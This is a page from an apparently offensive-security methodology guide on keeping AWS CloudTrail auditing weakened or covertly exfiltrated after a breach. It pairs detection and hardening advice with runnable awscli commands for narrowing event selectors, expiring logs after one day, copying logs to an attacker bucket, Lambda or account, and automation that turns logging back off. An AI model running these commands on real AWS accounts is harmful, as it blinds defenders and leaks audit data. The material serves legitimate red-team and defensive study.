---
cstg_id: CSTG-AWS-CLOUDTRAIL-PERSIST
title: "AWS Cloudtrail - Persistence"
provider: aws
service: cloudtrail
phase: persistence
required_access: assumed-breach
required_permissions:
  - cloudtrail:UpdateTrail
  - cloudtrail:PutEventSelectors
  - cloudtrail:StopLogging
  - cloudtrail:CreateTrail
  - s3:PutBucketPolicy
  - s3:PutLifecycleConfiguration
  - s3:PutBucketNotification
  - kms:PutKeyPolicy
  - events:PutRule
  - events:PutTargets
  - logs:PutSubscriptionFilter
  - iam:PutRolePolicy
tools:
  - awscli
  - pacu
  - stratus-red-team
references:
  - "https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-create-and-update-a-trail.html"
  - "https://docs.aws.amazon.com/awscloudtrail/latest/userguide/logging-data-events-with-cloudtrail.html"
  - "https://docs.aws.amazon.com/AmazonS3/latest/userguide/NotificationHowTo.html"
  - "https://hackingthe.cloud/aws/avoiding-detection/disrupting-cloudtrail/"
  - "https://docs.aws.amazon.com/awscloudtrail/latest/userguide/best-practices-security.html"
license: CC BY-SA 4.0
---

## Summary

Persistence against CloudTrail is the art of keeping the audit record permanently weakened — or quietly leaking it — in a way that survives credential rotation, blends into normal configuration, and outlasts a single intrusion. Unlike one-off [Post-Exploitation](../05-post-exploitation/aws-cloudtrail-post-exploitation.md) disruption (stop, act, restart), persistence techniques aim to leave a durable state: a selector that permanently excludes certain activity, a lifecycle rule that perpetually ages out logs, a redirected or duplicated delivery stream that continuously exfiltrates the log to attacker-controlled storage, or an EventBridge/Lambda construct that automatically re-disables logging whenever a defender re-enables it.

This page assumes the access and coverage map from [Enumeration](../02-services/aws-cloudtrail-enum.md) and the privileges established earlier in the kill chain. The attacker objective is *durable reduction of audit fidelity* with minimal ongoing visibility: maintain a blind spot, or a covert copy of the log, that persists without further interactive action and that resists routine remediation.

## Prerequisites

A foothold with persistent ability (via its own identity, an assumable role, or a passed service role) to alter CloudTrail configuration (`UpdateTrail`, `PutEventSelectors`, `CreateTrail`, `StopLogging`), the delivery layer (`s3:PutBucketPolicy`, `PutLifecycleConfiguration`, `PutBucketNotification`, `kms:PutKeyPolicy`), and/or the automation layer (`events:PutRule`/`PutTargets`, `logs:PutSubscriptionFilter`, `lambda:*`, `iam:PutRolePolicy`). As with post-exploitation, an **organization trail** owned by a separate management account blocks the trail-level techniques from a member-account foothold; in that case persistence is limited to whatever the reachable destination/automation accounts expose.

## Enumeration

Identify the most durable host for persistence and confirm what protections must be circumvented:

```bash
aws cloudtrail describe-trails --query 'trailList[].{Name:Name,Org:IsOrganizationTrail,Multi:IsMultiRegionTrail,Bucket:S3BucketName,KMS:KmsKeyId,Validation:LogFileValidationEnabled}'
aws cloudtrail get-event-selectors --trail-name <trail>
aws s3api get-object-lock-configuration --bucket <log-bucket> 2>/dev/null   # immutability defeats lifecycle/delete persistence
aws events list-rules --query 'Rules[].Name'                               # existing automation to hide among
```

## Misconfigurations & Findings

- **No change-control or alerting on CloudTrail/destination configuration**, so a persistent selector, lifecycle rule, or delivery redirect goes unnoticed indefinitely.
- **Mutable, non-org-owned log bucket** that a workload account can permanently re-point or age out.
- **Permission to create EventBridge rules and Lambda targets** in the same account as the trail — the basis for self-healing log-disablement automation.
- **Reachable KMS key policy** that can be rewritten to grant an external account persistent decrypt on the log stream.
- **No log-file integrity validation**, so a permanently narrowed/exfiltrated stream leaves no cryptographic trail.
- **Broad `iam:PutRolePolicy`/service-role reuse**, letting automation roles be granted the actions needed to re-disable logging.

## Exploitation

### Permanently narrowed event selectors

A durable, low-noise blind spot: leave the trail logging (so `IsLogging` stays healthy) but permanently exclude the categories that matter — for example, drop all data events and limit management events to write-only so reconnaissance and object access are never recorded:

```bash
aws cloudtrail put-event-selectors --trail-name <trail> --event-selectors '[
  { "ReadWriteType": "WriteOnly", "IncludeManagementEvents": true, "DataResources": [] }
]'
```

Because the trail still reports as enabled and delivering, this survives casual review; only an explicit selector audit (or AWS Config rule checking for data-event coverage) detects it.

### Perpetual log expiry via S3 lifecycle

Instead of repeatedly deleting objects, install a lifecycle rule that continuously expires delivered logs after a minimal window — durable log loss that needs no further action:

```bash
aws s3api put-bucket-lifecycle-configuration --bucket <log-bucket> \
  --lifecycle-configuration '{"Rules":[{"ID":"retention","Status":"Enabled","Filter":{"Prefix":"AWSLogs/"},"Expiration":{"Days":1},"NoncurrentVersionExpiration":{"NoncurrentDays":1}}]}'
```

(The `NoncurrentVersionExpiration` clause also ages out versioned copies; S3 Object Lock in compliance mode defeats this entirely.)

### Continuous log exfiltration (duplicate or redirected delivery)

Maintain a covert, ongoing copy of the audit log in attacker-controlled storage:

```bash
# Option A: create a SECOND trail delivering to an attacker-readable bucket (original stays intact, less suspicious)
aws cloudtrail create-trail --name billing-archive --s3-bucket-name attacker-bucket --is-multi-region-trail
aws cloudtrail start-logging --name billing-archive

# Option B: add an S3 event notification on the log bucket that copies each new object out via Lambda/SQS
aws s3api put-bucket-notification-configuration --bucket <log-bucket> \
  --notification-configuration file://copy-on-put.json

# Option C: subscribe a Lambda to the trail's CloudWatch Logs group to stream events out in real time
aws logs put-subscription-filter --log-group-name <trail-log-group> \
  --filter-name x --filter-pattern "" --destination-arn arn:aws:lambda:...:function:exfil
```

A second, innocuously named trail is often the lowest-noise option because creating trails is a legitimate administrative activity.

### Cross-account decrypt via KMS key policy

If the log key policy is reachable, grant a persistent external principal decrypt access, so the attacker can read the encrypted log archive indefinitely even without account credentials:

```bash
aws kms put-key-policy --key-id <log-cmk> --policy-name default --policy file://shared-key-policy.json
# shared-key-policy.json adds Principal: arn:aws:iam::<attacker-acct>:root with kms:Decrypt
```

### Self-healing logging-disablement automation

Make logging disruption durable against remediation by wiring an EventBridge rule that fires when a trail is re-enabled and invokes a Lambda that re-disables it:

```bash
# Rule triggers on StartLogging / UpdateTrail events from CloudTrail
aws events put-rule --name reassert-logging-off \
  --event-pattern '{"source":["aws.cloudtrail"],"detail":{"eventName":["StartLogging","UpdateTrail","PutEventSelectors"]}}'
aws events put-targets --rule reassert-logging-off \
  --targets 'Id=1,Arn=arn:aws:lambda:us-east-1:111122223333:function:reassert'   # Lambda calls StopLogging/PutEventSelectors
```

The Lambda restores the attacker's preferred state whenever a defender attempts to fix it — turning a one-time disruption into a persistent condition tied to ordinary account events. (Hardening accounts with an org-owned trail neutralizes this, since the member-account Lambda cannot alter the central trail.)

## Detection & Logging

- **CloudTrail** records the establishing actions under `cloudtrail.amazonaws.com` (`CreateTrail`, `UpdateTrail`, `PutEventSelectors`, `StopLogging`), `s3.amazonaws.com` (`PutBucketLifecycleConfiguration`, `PutBucketNotificationConfiguration`, `PutBucketPolicy`), `kms.amazonaws.com` (`PutKeyPolicy`), `events.amazonaws.com` (`PutRule`/`PutTargets`), and `logs.amazonaws.com` (`PutSubscriptionFilter`). Any of these on or around the known logging infrastructure, by a non-pipeline principal, is high-signal.
- A **new trail** (`CreateTrail`) — especially one whose `S3BucketName` is outside the organization's known accounts — is a strong exfiltration indicator; audit `UpdateTrail`/`CreateTrail` destination ARNs against an allowlist.
- A **bucket lifecycle rule** with a very short expiration on a log bucket, or a **bucket notification / subscription filter** delivering to an unfamiliar Lambda/SQS, indicates covert copying or perpetual deletion.
- A **KMS key policy** change adding an external `Principal` with `kms:Decrypt` on the log key is a cross-account exfiltration setup.
- The **self-healing pattern** is detectable as a recurring `StopLogging`/`PutEventSelectors` immediately following each `StartLogging` — and as the EventBridge rule + Lambda that implement it.
- **GuardDuty** `Stealth:IAMUser/CloudTrailLoggingDisabled` fires on the disabling actions; **AWS Config** rules continuously assert logging is enabled, multi-region, encrypted, and that data events are captured.
- **Log-file integrity validation** digest chains reveal whether the recorded stream was permanently narrowed or files were aged out.

## Remediation & Hardening

- Use a **multi-region organization trail** delivering to a **dedicated log-archive account**, removing member-account ability to narrow, redirect, delete, or self-heal-disable the central trail.
- Enforce **SCPs** denying `cloudtrail:UpdateTrail`, `PutEventSelectors`, `StopLogging`, `DeleteTrail`, and `CreateTrail` (to non-approved destinations) outside a logging-admin role.
- Make logs immutable: **S3 Object Lock (compliance mode)**, **versioning**, **MFA-delete**, and a deny-by-default bucket policy — defeating lifecycle-expiry and deletion persistence.
- Lock the **KMS key policy** so external principals cannot be granted decrypt; alarm on `PutKeyPolicy`.
- **Alert in real time** on every CloudTrail/destination/automation configuration change, and on creation of new trails, bucket notifications, subscription filters, and EventBridge rules touching logging resources.
- Maintain an **allowlist of approved log destinations** and reconcile all trail destinations against it.
- Enable **log-file integrity validation** and **CloudTrail Lake termination protection**, and continuously evaluate the relevant AWS Config rules (`cloudtrail-enabled`, `multi-region-cloudtrail-enabled`, `cloudtrail-s3-dataevents-enabled`, `cloud-trail-encryption-enabled`, `cloud-trail-log-file-validation-enabled`).

## Tools

- **awscli** — establishes every trail, S3, KMS, EventBridge, and CloudWatch Logs construct above.
- **Pacu** — `detection__disruption` module for minimizing/disabling trails; combine with backdoor/exfil modules for the delivery-redirect path.
- **stratus-red-team** — CloudTrail defense-evasion techniques for safely validating that these persistence states are detected.

## References

- Creating and updating a trail — https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-create-and-update-a-trail.html
- Logging data events — https://docs.aws.amazon.com/awscloudtrail/latest/userguide/logging-data-events-with-cloudtrail.html
- Configuring S3 event notifications — https://docs.aws.amazon.com/AmazonS3/latest/userguide/NotificationHowTo.html
- hackingthe.cloud — Disrupting CloudTrail — https://hackingthe.cloud/aws/avoiding-detection/disrupting-cloudtrail/
- CloudTrail security best practices — https://docs.aws.amazon.com/awscloudtrail/latest/userguide/best-practices-security.html
